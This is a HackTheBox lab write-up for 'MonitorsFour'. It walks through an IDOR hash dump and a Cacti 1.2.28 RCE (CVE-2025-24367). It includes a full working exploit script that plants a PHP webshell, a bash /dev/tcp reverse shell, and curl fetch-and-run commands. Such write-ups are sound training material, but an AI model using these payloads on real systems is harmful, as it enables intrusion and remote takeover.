# MonitorsFour - HackTheBox Writeup

**IP:** 10.10.11.98 | **OS:** Windows + Docker | **Difficulty:** Easy

---

## 1. Enumeration

### Port Scan
```bash
nmap -sC -sV 10.10.11.98
```
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Takeaway:** Port 80 redirects to `monitorsfour.htb`. WinRM (5985) suggests Windows host - potential lateral movement target.

### Add to Hosts
```bash
echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Subdomain Discovery
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" --hh 13688 http://10.10.11.98
```
```
000000034:   302   "cacti"
```

**Why this works:** We filter by response size (`--hh 13688`) to exclude default responses. Different size = different vhost.

```bash
echo "10.10.11.98 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Identify Cacti Version
```bash
curl -s http://cacti.monitorsfour.htb/cacti/ | grep -i version
```
```
Version 1.2.28
```

---

## 2. Vulnerability Discovery

### Token Parameter Bypass (IDOR)
The main site has an API endpoint that improperly validates tokens:

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```
```json
[
  {"id":2,"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins"},
  {"id":5,"username":"mwatson","password":"69196959c16b26ef00b77d82cf6eb169"},
  {"id":6,"username":"janderson","password":"2a22dcf99190c322d974c8df5ba3256b"},
  {"id":7,"username":"dthompson","password":"8d4a7e7fd08555133e056d9aacb1e519"}
]
```

**Why it works:** `token=0` triggers a type juggling or falsy value bypass, dumping all users.

### Crack the Hash
```bash
echo -n "wonderful1" | md5sum
# 56b32eb43e6f15395f6c46c1c9e1cd36
```

**Credentials:** `marcus:wonderful1`

---

## 3. Exploitation - CVE-2025-24367

### Vulnerability Overview
Cacti 1.2.28 allows authenticated RCE via graph template injection. Malicious RRDtool commands in the `right_axis_label` field create executable PHP files in the web root.

### Setup (Run These First)
```bash
# Add hosts entries
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts

# Create reverse shell payload
echo '#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash

# Start Apache
sudo systemctl start apache2

# Start listener in tmux (persistent)
tmux new-session -d -s shell "nc -lvnp 4455"
```

### Exploit Script (Tested & Working)

Save as `exploit.py` and run:
```bash
python3 exploit.py
```

```python
#!/usr/bin/env python3
"""CVE-2025-24367 - Cacti RCE via Graph Template Injection"""
import requests
import re

# CONFIG - Change these
LHOST = "YOUR_IP"      # Your tun0 IP
LPORT = "4455"
URL = "http://cacti.monitorsfour.htb"

s = requests.Session()

# Login
r = s.get(f'{URL}/cacti/index.php')
csrf = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text).group(1)
s.post(f'{URL}/cacti/index.php', data={
    '__csrf_magic': csrf, 'action': 'login',
    'login_username': 'marcus', 'login_password': 'wonderful1'
})
print("[+] Logged in as marcus")

# Inject webshell via RRDtool graph template
r = s.get(f'{URL}/cacti/graph_templates.php?action=template_edit&id=226')
csrf = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text).group(1)

# Payload creates shell.php with command execution via $_REQUEST[0]
rrdtool = """XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
"""

data = {
    "__csrf_magic": csrf, "name": "Unix - Logged in Users",
    "graph_template_id": "226", "graph_template_graph_id": "226",
    "save_component_template": "1", "right_axis_label": rrdtool,
    "title": "|host_description| - Logged in Users", "vertical_label": "users",
    "image_format_id": "3", "height": "200", "width": "700", "base_value": "1000",
    "slope_mode": "on", "auto_scale": "on", "auto_scale_opts": "2", "action": "save"
}

s.post(f'{URL}/cacti/graph_templates.php?header=false', data=data)
s.get(f'{URL}/cacti/graph_json.php?rra_id=0&local_graph_id=3')
print("[+] Webshell created at /cacti/shell.php")

# Test webshell
r = s.get(f'{URL}/cacti/shell.php?0=id')
print(f"[+] RCE confirmed: {r.text.split(',')[1].strip()}")

# Download and execute reverse shell
print("[*] Downloading shell script from Apache...")
s.get(f'{URL}/cacti/shell.php?0=curl%20{LHOST}/bash%20-o%20/tmp/s.sh')

print("[*] Triggering reverse shell...")
try:
    s.get(f'{URL}/cacti/shell.php?0=bash%20/tmp/s.sh', timeout=2)
except:
    pass

print(f"\n[+] Check listener: tmux attach -t shell")
```

### Access Your Shell
```bash
tmux attach -t shell
```

You should see:
```
connect to [YOUR_IP] from (UNKNOWN) [10.10.11.98] ...
www-data@821fbd6a43fa:~/html/cacti$
```

### Alternative: Manual Browser Exploitation

1. Login to `http://cacti.monitorsfour.htb/cacti/` as `marcus:wonderful1`
2. Go to: **Console → Templates → Graph Templates**
3. Click **Unix - Logged in Users** (ID 226)
4. In **Right Axis Label** field, paste:
```
XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
```
5. Click **Save**
6. Visit: `http://cacti.monitorsfour.htb/cacti/graph_json.php?local_graph_id=3`
7. Test webshell: `http://cacti.monitorsfour.htb/cacti/shell.php?0=id`
8. Download payload: `http://cacti.monitorsfour.htb/cacti/shell.php?0=curl%20YOUR_IP/bash%20-o%20/tmp/s.sh`
9. Trigger shell: `http://cacti.monitorsfour.htb/cacti/shell.php?0=bash%20/tmp/s.sh`

---

## 4. User Flag

```bash
www-data@821fbd6a43fa:$ cat /home/marcus/user.txt
87f9db79ef98e5c367d3ca15d2b70100
```

**Note:** You're inside a Docker container. Root requires container escape.

---

## 5. Key Takeaways

| Lesson | Details |
|--------|---------|
| **Vhost fuzzing is essential** | Main site gave nothing; subdomain had the vuln |
| **Test API edge cases** | `token=0` bypassed auth - always test falsy values |
| **Default creds ≠ full access** | `admin:admin` worked but had limited perms |
| **Credential reuse** | Marcus creds from main site worked on Cacti |
| **Know your CVEs** | Cacti 1.2.28 has multiple auth RCE paths |

---

## Quick Reference
```
monitorsfour.htb     → Main site, token vuln
cacti.monitorsfour.htb → Cacti 1.2.28, CVE-2025-24367
marcus:wonderful1    → Full Cacti admin
User flag            → /home/marcus/user.txt
```
